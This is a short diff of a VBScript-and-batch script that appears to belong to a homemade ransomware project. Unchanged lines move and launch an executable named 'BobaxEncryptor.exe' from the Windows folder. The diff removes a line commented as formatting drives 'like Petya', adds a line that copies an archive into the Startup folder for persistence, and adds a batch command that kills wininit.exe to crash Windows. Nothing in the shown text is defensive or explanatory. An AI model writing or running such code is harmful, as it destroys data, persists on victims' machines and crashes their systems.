@@ -15,5 +15,10 @@ CreateObject("Wscript.Shell").Run """file.bat""", 1, True
 FSO.Movefile "BobaxEncryptor.exe","C:\Windows\"
 CreateObject("Wscript.Shell").Run """BobaxEncryptor.exe""", 1, True
 
-'''FORMATS DRIVES... LIKE PETYA
-CreateObject("Wscript.Shell").Run """\WannaDie\bootloader\""", 1, True
+'''OH LORD
+FSO.Movefile "Master.7z","%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
+
+''' bsod
+@echo off
+taskkill /f /im wininit.exe
+pause
